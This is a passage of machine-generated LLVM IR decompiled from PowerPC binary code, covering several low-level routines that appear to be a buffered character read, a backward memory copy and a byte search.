  %v2_1000a840 = add i32 %tmp, 24
  %v3_1000a840 = inttoptr i32 %v2_1000a840 to i32*
  %v4_1000a840 = load i32, i32* %v3_1000a840, align 4
  store i32 %v4_1000a840, i32* %r0.global-to-local, align 4
  %v2_1000a844 = icmp ult i32 %v4_1000a83c, %v4_1000a840
  br i1 %v2_1000a844, label %dec_label_pc_1000a8ac, label %dec_label_pc_1000a84c

dec_label_pc_1000a84c:                            ; preds = %dec_label_pc_1000a828
  %v3_1000a84c = load i16, i16* %arg1, align 2
  %v4_1000a84c = zext i16 %v3_1000a84c to i32
  %v1_1000a850 = and i32 %v4_1000a84c, 131
  store i32 %v1_1000a850, i32* %r0.global-to-local, align 4
  %v2_1000a854 = icmp ugt i32 %v1_1000a850, 128
  br i1 %v2_1000a854, label %dec_label_pc_1000a86c, label %dec_label_pc_1000a85c

dec_label_pc_1000a85c:                            ; preds = %dec_label_pc_1000a84c
  store i32 268478564, i32* @lr, align 4
  %v3_1000a860 = call i32 @function_1000be54(i16* inttoptr (i32 128 to i16*), i32 %v4_1000a83c)
  store i32 %v3_1000a860, i32* %r3.global-to-local, align 4
  %v3_1000a864 = icmp eq i32 %v3_1000a860, 0
  br i1 %v3_1000a864, label %dec_label_pc_1000a85c.dec_label_pc_1000a86c_crit_edge, label %dec_label_pc_1000a948

dec_label_pc_1000a85c.dec_label_pc_1000a86c_crit_edge: ; preds = %dec_label_pc_1000a85c
  %v0_1000a86c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000a86c

dec_label_pc_1000a86c:                            ; preds = %dec_label_pc_1000a85c.dec_label_pc_1000a86c_crit_edge, %dec_label_pc_1000a84c
  %v2_1000a8cc = phi i32 [ %v0_1000a86c.pre, %dec_label_pc_1000a85c.dec_label_pc_1000a86c_crit_edge ], [ %tmp, %dec_label_pc_1000a84c ]
  %v1_1000a86c = inttoptr i32 %v2_1000a8cc to i16*
  %v2_1000a86c = load i16, i16* %v1_1000a86c, align 2
  %v3_1000a86c = zext i16 %v2_1000a86c to i32
  %v1_1000a870 = and i32 %v3_1000a86c, 2
  store i32 %v1_1000a870, i32* %r0.global-to-local, align 4
  %v3_1000a870 = icmp eq i32 %v1_1000a870, 0
  br i1 %v3_1000a870, label %dec_label_pc_1000a89c, label %dec_label_pc_1000a878

dec_label_pc_1000a878:                            ; preds = %dec_label_pc_1000a86c
  %v1_1000a878 = call i32 @__asm_rlwinm(i32 %v3_1000a86c, i32 2, i32 29, i32 29)
  %v1_1000a87c = load i32, i32* @r31, align 4
  %v2_1000a87c = add i32 %v1_1000a87c, %v1_1000a878
  store i32 %v2_1000a87c, i32* %r9.global-to-local, align 4
  %v1_1000a880 = add i32 %v2_1000a87c, 39
  %v2_1000a880 = inttoptr i32 %v1_1000a880 to i8*
  %v3_1000a880 = load i8, i8* %v2_1000a880, align 1
  %v4_1000a880 = zext i8 %v3_1000a880 to i32
  store i32 %v4_1000a880, i32* %r0.global-to-local, align 4
  %v1_1000a884 = add nsw i32 %v3_1000a86c, -1
  store i32 %v1_1000a884, i32* %r9.global-to-local, align 4
  %v1_1000a888 = trunc i32 %v1_1000a884 to i16
  %v3_1000a888 = inttoptr i32 %v1_1000a87c to i16*
  store i16 %v1_1000a888, i16* %v3_1000a888, align 2
  %v0_1000a88c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1000a88c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000a894 = load i32, i32* @r31, align 4
  %v2_1000a894 = add i32 %v1_1000a894, 40
  %v3_1000a894 = inttoptr i32 %v2_1000a894 to i32*
  store i32 0, i32* %v3_1000a894, align 4
  br label %dec_label_pc_1000a94c

dec_label_pc_1000a89c:                            ; preds = %dec_label_pc_1000a86c
  %v1_1000a89c = add i32 %v2_1000a8cc, 16
  %v2_1000a89c = inttoptr i32 %v1_1000a89c to i32*
  %v3_1000a89c = load i32, i32* %v2_1000a89c, align 4
  store i32 %v3_1000a89c, i32* %r9.global-to-local, align 4
  %v1_1000a8a0 = add i32 %v2_1000a8cc, 20
  %v2_1000a8a0 = inttoptr i32 %v1_1000a8a0 to i32*
  %v3_1000a8a0 = load i32, i32* %v2_1000a8a0, align 4
  store i32 %v3_1000a8a0, i32* %r0.global-to-local, align 4
  %v4_1000a8a4 = icmp eq i32 %v3_1000a8a0, %v3_1000a89c
  br i1 %v4_1000a8a4, label %dec_label_pc_1000a8b8, label %dec_label_pc_1000a8ac

dec_label_pc_1000a8ac:                            ; preds = %dec_label_pc_1000a89c, %dec_label_pc_1000a828
  %v1_1000a9207 = phi i32 [ %v2_1000a8cc, %dec_label_pc_1000a89c ], [ %tmp, %dec_label_pc_1000a828 ]
  %v0_1000a8ac = phi i32 [ %v3_1000a89c, %dec_label_pc_1000a89c ], [ %v4_1000a83c, %dec_label_pc_1000a828 ]
  %v1_1000a8ac = inttoptr i32 %v0_1000a8ac to i8*
  %v2_1000a8ac = load i8, i8* %v1_1000a8ac, align 1
  %v3_1000a8ac = zext i8 %v2_1000a8ac to i32
  store i32 %v3_1000a8ac, i32* %r3.global-to-local, align 4
  %v1_1000a8b0 = add i32 %v0_1000a8ac, 1
  store i32 %v1_1000a8b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000a920

dec_label_pc_1000a8b8:                            ; preds = %dec_label_pc_1000a89c
  %v1_1000a8b8 = add i32 %v2_1000a8cc, 4
  %v2_1000a8b8 = inttoptr i32 %v1_1000a8b8 to i32*
  %v3_1000a8b8 = load i32, i32* %v2_1000a8b8, align 4
  store i32 %v3_1000a8b8, i32* %r0.global-to-local, align 4
  %v3_1000a8bc = icmp eq i32 %v3_1000a8b8, -2
  br i1 %v3_1000a8bc, label %dec_label_pc_1000a8c4, label %dec_label_pc_1000a8d4

dec_label_pc_1000a8c4:                            ; preds = %dec_label_pc_1000a8b8
  %v1_1000a8c4 = or i32 %v3_1000a86c, 4
  store i32 %v1_1000a8c4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1000a8cc = trunc i32 %v1_1000a8c4 to i16
  store i16 %v1_1000a8cc, i16* %v1_1000a86c, align 2
  br label %dec_label_pc_1000a94c

dec_label_pc_1000a8d4:                            ; preds = %dec_label_pc_1000a8b8
  %v1_1000a8d4 = and i32 %v3_1000a86c, 768
  store i32 %v1_1000a8d4, i32* %r0.global-to-local, align 4
  %v3_1000a8d4 = icmp eq i32 %v1_1000a8d4, 0
  br i1 %v3_1000a8d4, label %dec_label_pc_1000a8e8, label %dec_label_pc_1000a8dc

dec_label_pc_1000a8dc:                            ; preds = %dec_label_pc_1000a8d4
  store i32 ptrtoint (i32** @global_var_10010438.227 to i32), i32* %r3.global-to-local, align 4
  store i32 268478696, i32* @lr, align 4
  %v4_1000a8e4 = call i32 @function_10006c5c(i16* bitcast (i32** @global_var_10010438.227 to i16*), i32 %v3_1000a89c)
  store i32 %v4_1000a8e4, i32* %r3.global-to-local, align 4
  %v0_1000a8e8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000a8e8

dec_label_pc_1000a8e8:                            ; preds = %dec_label_pc_1000a8d4, %dec_label_pc_1000a8dc
  %v0_1000a928 = phi i32 [ %v2_1000a8cc, %dec_label_pc_1000a8d4 ], [ %v0_1000a8e8.pre, %dec_label_pc_1000a8dc ]
  %v1_1000a8e8 = add i32 %v0_1000a928, 8
  %v2_1000a8e8 = inttoptr i32 %v1_1000a8e8 to i32*
  %v3_1000a8e8 = load i32, i32* %v2_1000a8e8, align 4
  store i32 %v3_1000a8e8, i32* %r9.global-to-local, align 4
  %v1_1000a8ec = add i32 %v0_1000a928, 12
  %v2_1000a8ec = inttoptr i32 %v1_1000a8ec to i32*
  %v3_1000a8ec = load i32, i32* %v2_1000a8ec, align 4
  store i32 %v3_1000a8ec, i32* %r0.global-to-local, align 4
  %v4_1000a8f0 = icmp eq i32 %v3_1000a8ec, %v3_1000a8e8
  br i1 %v4_1000a8f0, label %dec_label_pc_1000a928, label %dec_label_pc_1000a8f8

dec_label_pc_1000a8f8:                            ; preds = %dec_label_pc_1000a8e8
  %v2_1000a8f8 = add i32 %v0_1000a928, 24
  %v3_1000a8f8 = inttoptr i32 %v2_1000a8f8 to i32*
  store i32 %v3_1000a8e8, i32* %v3_1000a8f8, align 4
  %v0_1000a8fc = load i32, i32* @r31, align 4
  store i32 %v0_1000a8fc, i32* %r3.global-to-local, align 4
  store i32 268478724, i32* @lr, align 4
  %v3_1000a900 = call i32 @function_1000be0c(i32 %v0_1000a8fc, i32 %v3_1000a8e8)
  store i32 %v3_1000a900, i32* %r3.global-to-local, align 4
  %v3_1000a904 = icmp eq i32 %v3_1000a900, 0
  br i1 %v3_1000a904, label %dec_label_pc_1000a948, label %dec_label_pc_1000a90c

dec_label_pc_1000a90c:                            ; preds = %dec_label_pc_1000a8f8
  %v0_1000a90c = load i32, i32* @r31, align 4
  %v1_1000a90c = add i32 %v0_1000a90c, 20
  %v2_1000a90c = inttoptr i32 %v1_1000a90c to i32*
  %v3_1000a90c = load i32, i32* %v2_1000a90c, align 4
  store i32 %v3_1000a90c, i32* %r0.global-to-local, align 4
  %v1_1000a910 = add i32 %v0_1000a90c, 16
  %v2_1000a910 = inttoptr i32 %v1_1000a910 to i32*
  %v3_1000a910 = load i32, i32* %v2_1000a910, align 4
  store i32 %v3_1000a910, i32* %r9.global-to-local, align 4
  %v2_1000a914 = add i32 %v0_1000a90c, 24
  %v3_1000a914 = inttoptr i32 %v2_1000a914 to i32*
  store i32 %v3_1000a90c, i32* %v3_1000a914, align 4
  %v0_1000a918 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a918 = add i32 %v0_1000a918, 1
  store i32 %v1_1000a918, i32* %r0.global-to-local, align 4
  %v1_1000a91c = inttoptr i32 %v0_1000a918 to i8*
  %v2_1000a91c = load i8, i8* %v1_1000a91c, align 1
  %v3_1000a91c = zext i8 %v2_1000a91c to i32
  store i32 %v3_1000a91c, i32* %r3.global-to-local, align 4
  %v1_1000a920.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000a920

dec_label_pc_1000a920:                            ; preds = %dec_label_pc_1000a8ac, %dec_label_pc_1000a90c
  %v1_1000a920 = phi i32 [ %v1_1000a9207, %dec_label_pc_1000a8ac ], [ %v1_1000a920.pre, %dec_label_pc_1000a90c ]
  %v0_1000a920 = phi i32 [ %v1_1000a8b0, %dec_label_pc_1000a8ac ], [ %v1_1000a918, %dec_label_pc_1000a90c ]
  %v2_1000a920 = add i32 %v1_1000a920, 16
  %v3_1000a920 = inttoptr i32 %v2_1000a920 to i32*
  store i32 %v0_1000a920, i32* %v3_1000a920, align 4
  br label %dec_label_pc_1000a94c

dec_label_pc_1000a928:                            ; preds = %dec_label_pc_1000a8e8
  %v1_1000a928 = inttoptr i32 %v0_1000a928 to i16*
  store i32 %v0_1000a928, i32* %r3.global-to-local, align 4
  %v2_1000a92c = ptrtoint i8* %stack_var_-24 to i32
  store i32 268478776, i32* @lr, align 4
  %v5_1000a934 = call i32 @function_1000bc9c(i16* %v1_1000a928, i32 %v2_1000a92c, i32 1)
  store i32 %v5_1000a934, i32* %r3.global-to-local, align 4
  %v3_1000a938 = icmp eq i32 %v5_1000a934, 0
  br i1 %v3_1000a938, label %dec_label_pc_1000a948, label %dec_label_pc_1000a940

dec_label_pc_1000a940:                            ; preds = %dec_label_pc_1000a928
  %v3_1000a940 = load i8, i8* %stack_var_-24, align 1
  %v4_1000a940 = sext i8 %v3_1000a940 to i32
  store i32 %v4_1000a940, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a94c

dec_label_pc_1000a948:                            ; preds = %dec_label_pc_1000a85c, %dec_label_pc_1000a928, %dec_label_pc_1000a8f8
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a94c

dec_label_pc_1000a94c:                            ; preds = %dec_label_pc_1000a940, %dec_label_pc_1000a920, %dec_label_pc_1000a8c4, %dec_label_pc_1000a878, %dec_label_pc_1000a948
  store i32 %v0_1000a828, i32* %r0.global-to-local, align 4
  store i32 %v0_1000a830, i32* @r31, align 4
  %v0_1000a95c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000a95c

; uselistorder directives
  uselistorder i32 %v0_1000a928, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1000a8ac, { 1, 0 }
  uselistorder i32 %v3_1000a89c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000a87c, { 1, 0 }
  uselistorder i32 %v3_1000a86c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_1000a8cc, { 1, 2, 0, 4, 3, 5 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 12, 3, 2, 1, 5, 4, 6, 7, 8, 9, 10, 11, 13, 14, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i16* bitcast (i32** @global_var_10010438.227 to i16*), { 1, 0 }
  uselistorder i16* @global_var_10010114.201, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000a94c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000a948, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a920, { 1, 0 }
  uselistorder label %dec_label_pc_1000a8e8, { 1, 0 }
}

define i32 @function_1000a960(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000a960:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  %v2_1000a960 = icmp ult i32 %arg2, %arg1
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v0_1000a968 = load i32, i32* @r5, align 4
  store i32 %v0_1000a968, i32* @r11, align 4
  br i1 %v2_1000a960, label %dec_label_pc_1000a974, label %dec_label_pc_1000a970

dec_label_pc_1000a970:                            ; preds = %dec_label_pc_1000a960
  %v0_1000a970 = call i32 @function_10007108()
  store i32 %v0_1000a970, i32* @r3, align 4
  %v0_1000a974.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000a974

dec_label_pc_1000a974:                            ; preds = %dec_label_pc_1000a960, %dec_label_pc_1000a970
  %v0_1000a974 = phi i32 [ %v0_1000a968, %dec_label_pc_1000a960 ], [ %v0_1000a974.pre, %dec_label_pc_1000a970 ]
  %v1_1000a974 = call i32 @__asm_rlwinm.(i32 %v0_1000a974, i32 29, i32 3, i32 31)
  store i32 %v1_1000a974, i32* %r9.global-to-local, align 4
  %v4_1000a974 = icmp eq i32 %v1_1000a974, 0
  %v1_1000a978 = load i32, i32* @r5, align 4
  %v2_1000a978 = add i32 %v1_1000a978, %arg2
  store i32 %v2_1000a978, i32* %r4.global-to-local, align 4
  %v0_1000a97c = load i32, i32* @r3, align 4
  %v2_1000a97c = add i32 %v0_1000a97c, %v1_1000a978
  store i32 %v2_1000a97c, i32* %r10.global-to-local, align 4
  br i1 %v4_1000a974, label %dec_label_pc_1000a9a4, label %dec_label_pc_1000a984

dec_label_pc_1000a984:                            ; preds = %dec_label_pc_1000a974
  %v1_1000a984 = urem i32 %v2_1000a97c, 4
  %v3_1000a984 = icmp eq i32 %v1_1000a984, 0
  br i1 %v3_1000a984, label %dec_label_pc_1000a98c, label %dec_label_pc_1000a9d8

dec_label_pc_1000a98c:                            ; preds = %dec_label_pc_1000a9f0.dec_label_pc_1000a98c_crit_edge, %dec_label_pc_1000a984
  %v1_1000a998.pre = phi i32 [ %v1_1000a998.pre.pre, %dec_label_pc_1000a9f0.dec_label_pc_1000a98c_crit_edge ], [ %v2_1000a97c, %dec_label_pc_1000a984 ]
  %v0_1000a98c = phi i32 [ %v1_1000a9f0, %dec_label_pc_1000a9f0.dec_label_pc_1000a98c_crit_edge ], [ %v1_1000a974, %dec_label_pc_1000a984 ]
  store i32 %v0_1000a98c, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000a990

dec_label_pc_1000a990:                            ; preds = %dec_label_pc_1000a990, %dec_label_pc_1000a98c
  %v1_1000a998 = phi i32 [ %v2_1000a99c, %dec_label_pc_1000a990 ], [ %v1_1000a998.pre, %dec_label_pc_1000a98c ]
  %v0_1000a990 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a990 = add i32 %v0_1000a990, -4
  %v2_1000a990 = inttoptr i32 %v1_1000a990 to i32*
  %v3_1000a990 = load i32, i32* %v2_1000a990, align 4
  %v1_1000a994 = add i32 %v0_1000a990, -8
  %v2_1000a994 = inttoptr i32 %v1_1000a994 to i32*
  %v3_1000a994 = load i32, i32* %v2_1000a994, align 4
  store i32 %v3_1000a994, i32* %r9.global-to-local, align 4
  store i32 %v1_1000a994, i32* %r4.global-to-local, align 4
  %v2_1000a998 = add i32 %v1_1000a998, -4
  %v3_1000a998 = inttoptr i32 %v2_1000a998 to i32*
  store i32 %v3_1000a990, i32* %v3_1000a998, align 4
  %v0_1000a99c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a99c = load i32, i32* %r10.global-to-local, align 4
  %v2_1000a99c = add i32 %v1_1000a99c, -8
  %v3_1000a99c = inttoptr i32 %v2_1000a99c to i32*
  store i32 %v0_1000a99c, i32* %v3_1000a99c, align 4
  store i32 %v2_1000a99c, i32* %r10.global-to-local, align 4
  %v0_1000a9a0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a9a0 = add i32 %v0_1000a9a0, -1
  store i32 %v1_1000a9a0, i32* %ctr.global-to-local, align 4
  %v2_1000a9a0 = icmp eq i32 %v1_1000a9a0, 0
  br i1 %v2_1000a9a0, label %dec_label_pc_1000a9a4, label %dec_label_pc_1000a990

dec_label_pc_1000a9a4:                            ; preds = %dec_label_pc_1000a990, %dec_label_pc_1000a9f0, %dec_label_pc_1000a974
  %v0_1000a9a4 = load i32, i32* @r11, align 4
  %v1_1000a9a4 = urem i32 %v0_1000a9a4, 8
  store i32 %v1_1000a9a4, i32* %r5.global-to-local, align 4
  %tmp = icmp ult i32 %v1_1000a9a4, 4
  br i1 %tmp, label %dec_label_pc_1000a9bc, label %dec_label_pc_1000a9b0

dec_label_pc_1000a9b0:                            ; preds = %dec_label_pc_1000a9a4
  %v0_1000a9b0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a9b0 = add i32 %v0_1000a9b0, -4
  %v2_1000a9b0 = inttoptr i32 %v1_1000a9b0 to i32*
  %v3_1000a9b0 = load i32, i32* %v2_1000a9b0, align 4
  store i32 %v1_1000a9b0, i32* %r4.global-to-local, align 4
  %v1_1000a9b4 = add nsw i32 %v1_1000a9a4, -4
  store i32 %v1_1000a9b4, i32* %r5.global-to-local, align 4
  %v1_1000a9b8 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000a9b8 = add i32 %v1_1000a9b8, -4
  %v3_1000a9b8 = inttoptr i32 %v2_1000a9b8 to i32*
  store i32 %v3_1000a9b0, i32* %v3_1000a9b8, align 4
  store i32 %v2_1000a9b8, i32* %r10.global-to-local, align 4
  %v0_1000a9bc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000a9bc

dec_label_pc_1000a9bc:                            ; preds = %dec_label_pc_1000a9a4, %dec_label_pc_1000a9b0
  %v0_1000a9c4 = phi i32 [ %v1_1000a9a4, %dec_label_pc_1000a9a4 ], [ %v0_1000a9bc.pre, %dec_label_pc_1000a9b0 ]
  %v3_1000a9bc = icmp eq i32 %v0_1000a9c4, 0
  br i1 %v3_1000a9bc, label %dec_label_pc_1000a9fc, label %dec_label_pc_1000a9c4

dec_label_pc_1000a9c4:                            ; preds = %dec_label_pc_1000a9bc
  store i32 %v0_1000a9c4, i32* %ctr.global-to-local, align 4
  %v2_1000a9cc.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a9c8

dec_label_pc_1000a9c8:                            ; preds = %dec_label_pc_1000a9c8, %dec_label_pc_1000a9c4
  %v2_1000a9cc = phi i32 [ %v3_1000a9cc, %dec_label_pc_1000a9c8 ], [ %v2_1000a9cc.pre, %dec_label_pc_1000a9c4 ]
  %v0_1000a9c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a9c8 = add i32 %v0_1000a9c8, -1
  %v2_1000a9c8 = inttoptr i32 %v1_1000a9c8 to i8*
  %v3_1000a9c8 = load i8, i8* %v2_1000a9c8, align 1
  store i32 %v1_1000a9c8, i32* %r4.global-to-local, align 4
  %v3_1000a9cc = add i32 %v2_1000a9cc, -1
  %v4_1000a9cc = inttoptr i32 %v3_1000a9cc to i8*
  store i8 %v3_1000a9c8, i8* %v4_1000a9cc, align 1
  store i32 %v3_1000a9cc, i32* %r10.global-to-local, align 4
  %v0_1000a9d0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a9d0 = add i32 %v0_1000a9d0, -1
  store i32 %v1_1000a9d0, i32* %ctr.global-to-local, align 4
  %v2_1000a9d0 = icmp eq i32 %v1_1000a9d0, 0
  br i1 %v2_1000a9d0, label %dec_label_pc_1000a9fc, label %dec_label_pc_1000a9c8

dec_label_pc_1000a9d8:                            ; preds = %dec_label_pc_1000a984
  %v1_1000a9d8 = sub nsw i32 4, %v1_1000a984
  store i32 %v1_1000a9d8, i32* %ctr.global-to-local, align 4
  %v2_1000a9e0 = sub i32 %v1_1000a978, %v1_1000a9d8
  store i32 %v2_1000a9e0, i32* @r11, align 4
  %v1_1000a9e49 = add i32 %v2_1000a978, -1
  %v2_1000a9e410 = inttoptr i32 %v1_1000a9e49 to i8*
  %v3_1000a9e411 = load i8, i8* %v2_1000a9e410, align 1
  store i32 %v1_1000a9e49, i32* %r4.global-to-local, align 4
  %v3_1000a9e813 = add i32 %v2_1000a97c, -1
  %v4_1000a9e814 = inttoptr i32 %v3_1000a9e813 to i8*
  store i8 %v3_1000a9e411, i8* %v4_1000a9e814, align 1
  store i32 %v3_1000a9e813, i32* %r10.global-to-local, align 4
  %v0_1000a9ec15 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a9ec16 = add i32 %v0_1000a9ec15, -1
  store i32 %v1_1000a9ec16, i32* %ctr.global-to-local, align 4
  %v2_1000a9ec17 = icmp eq i32 %v1_1000a9ec16, 0
  br i1 %v2_1000a9ec17, label %dec_label_pc_1000a9f0, label %dec_label_pc_1000a9e4.dec_label_pc_1000a9e4_crit_edge

dec_label_pc_1000a9e4.dec_label_pc_1000a9e4_crit_edge: ; preds = %dec_label_pc_1000a9d8, %dec_label_pc_1000a9e4.dec_label_pc_1000a9e4_crit_edge
  %v3_1000a9e818 = phi i32 [ %v3_1000a9e8, %dec_label_pc_1000a9e4.dec_label_pc_1000a9e4_crit_edge ], [ %v3_1000a9e813, %dec_label_pc_1000a9d8 ]
  %v0_1000a9e4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a9e4 = add i32 %v0_1000a9e4.pre, -1
  %v2_1000a9e4 = inttoptr i32 %v1_1000a9e4 to i8*
  %v3_1000a9e4 = load i8, i8* %v2_1000a9e4, align 1
  store i32 %v1_1000a9e4, i32* %r4.global-to-local, align 4
  %v3_1000a9e8 = add i32 %v3_1000a9e818, -1
  %v4_1000a9e8 = inttoptr i32 %v3_1000a9e8 to i8*
  store i8 %v3_1000a9e4, i8* %v4_1000a9e8, align 1
  store i32 %v3_1000a9e8, i32* %r10.global-to-local, align 4
  %v0_1000a9ec = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a9ec = add i32 %v0_1000a9ec, -1
  store i32 %v1_1000a9ec, i32* %ctr.global-to-local, align 4
  %v2_1000a9ec = icmp eq i32 %v1_1000a9ec, 0
  br i1 %v2_1000a9ec, label %dec_label_pc_1000a9f0, label %dec_label_pc_1000a9e4.dec_label_pc_1000a9e4_crit_edge

dec_label_pc_1000a9f0:                            ; preds = %dec_label_pc_1000a9e4.dec_label_pc_1000a9e4_crit_edge, %dec_label_pc_1000a9d8
  %v0_1000a9f0 = load i32, i32* @r11, align 4
  %v1_1000a9f0 = call i32 @__asm_rlwinm.(i32 %v0_1000a9f0, i32 29, i32 3, i32 31)
  store i32 %v1_1000a9f0, i32* %r9.global-to-local, align 4
  %v4_1000a9f0 = icmp eq i32 %v1_1000a9f0, 0
  br i1 %v4_1000a9f0, label %dec_label_pc_1000a9a4, label %dec_label_pc_1000a9f0.dec_label_pc_1000a98c_crit_edge

dec_label_pc_1000a9f0.dec_label_pc_1000a98c_crit_edge: ; preds = %dec_label_pc_1000a9f0
  %v1_1000a998.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000a98c

dec_label_pc_1000a9fc:                            ; preds = %dec_label_pc_1000a9c8, %dec_label_pc_1000a9bc
  %v0_1000a9fc = load i32, i32* %r8.global-to-local, align 4
  ret i32 %v0_1000a9fc

; uselistorder directives
  uselistorder i32 %v1_1000a9f0, { 1, 2, 0 }
  uselistorder i32 %v1_1000a9ec, { 1, 0 }
  uselistorder i32 %v3_1000a9e8, { 1, 2, 0 }
  uselistorder i32 %v1_1000a9d0, { 1, 0 }
  uselistorder i32 %v3_1000a9cc, { 1, 2, 0 }
  uselistorder i32 %v1_1000a9a4, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1000a9a0, { 1, 0 }
  uselistorder i32 %v2_1000a99c, { 1, 2, 0 }
  uselistorder i32 %v1_1000a984, { 1, 0 }
  uselistorder i32 %v2_1000a97c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000a978, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3, 6, 4, 8, 5, 7, 9 }
  uselistorder i32* %r10.global-to-local, { 1, 2, 0, 3, 8, 4, 6, 5, 7, 9 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 -8, { 2, 3, 1, 4, 0, 5, 6, 7 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm., { 1, 2, 0, 5, 6, 3, 4 }
  uselistorder i32* @r11, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_1000a9e4.dec_label_pc_1000a9e4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000a9bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000a9a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a974, { 1, 0 }
}

define i32 @function_1000aa04(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000aa04:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_1000aa08 = urem i32 %arg1, 256
  store i32 %v1_1000aa08, i32* %r4.global-to-local, align 4
  %v0_1000aa287 = load i32, i32* @r3, align 4
  store i32 %arg2, i32* %ctr.global-to-local, align 4
  %v2_1000aa2c13 = icmp eq i32 %arg2, 0
  br i1 %v2_1000aa2c13, label %dec_label_pc_1000aa34, label %dec_label_pc_1000aa30

dec_label_pc_1000aa14:                            ; preds = %dec_label_pc_1000aa30
  %v1_1000aa14 = inttoptr i32 %v0_1000aa14 to i8*
  %v2_1000aa14 = load i8, i8* %v1_1000aa14, align 1
  %v3_1000aa14 = zext i8 %v2_1000aa14 to i32
  %v0_1000aa18 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000aa18 = add i32 %v0_1000aa18, -1
  store i32 %v1_1000aa18, i32* %r5.global-to-local, align 4
  %v1_1000aa1c = load i32, i32* %r4.global-to-local, align 4
  %v4_1000aa1c = icmp eq i32 %v3_1000aa14, %v1_1000aa1c
  %v0_1000aa20 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000aa1c, i32 %v0_1000aa20)
  %v0_1000aa24 = load i32, i32* @r3, align 4
  %v1_1000aa24 = add i32 %v0_1000aa24, 1
  store i32 %v1_1000aa24, i32* @r3, align 4
  %v0_1000aa2c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000aa2c = add i32 %v0_1000aa2c, -1
  store i32 %v1_1000aa2c, i32* %ctr.global-to-local, align 4
  %v2_1000aa2c = icmp eq i32 %v1_1000aa2c, 0
  br i1 %v2_1000aa2c, label %dec_label_pc_1000aa34.loopexit, label %dec_label_pc_1000aa30

dec_label_pc_1000aa30:                            ; preds = %dec_label_pc_1000aa04, %dec_label_pc_1000aa14
  %v0_1000aa14 = phi i32 [ %v1_1000aa24, %dec_label_pc_1000aa14 ], [ %v0_1000aa287, %dec_label_pc_1000aa04 ]
  %v0_1000aa30.in.in = phi i32 [ %v1_1000aa24, %dec_label_pc_1000aa14 ], [ %v0_1000aa287, %dec_label_pc_1000aa04 ]
  %v0_1000aa30.in = urem i32 %v0_1000aa30.in.in, 4
  %v0_1000aa30 = icmp eq i32 %v0_1000aa30.in, 0
  br i1 %v0_1000aa30, label %dec_label_pc_1000aa34.loopexit, label %dec_label_pc_1000aa14

dec_label_pc_1000aa34.loopexit:                   ; preds = %dec_label_pc_1000aa30, %dec_label_pc_1000aa14
  %v0_1000aa5c16.ph = phi i32 [ %v1_1000aa24, %dec_label_pc_1000aa14 ], [ %v0_1000aa14, %dec_label_pc_1000aa30 ]
  %v0_1000aa34.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_1000aa38.pre = load i32, i32* %r5.global-to-local, align 4
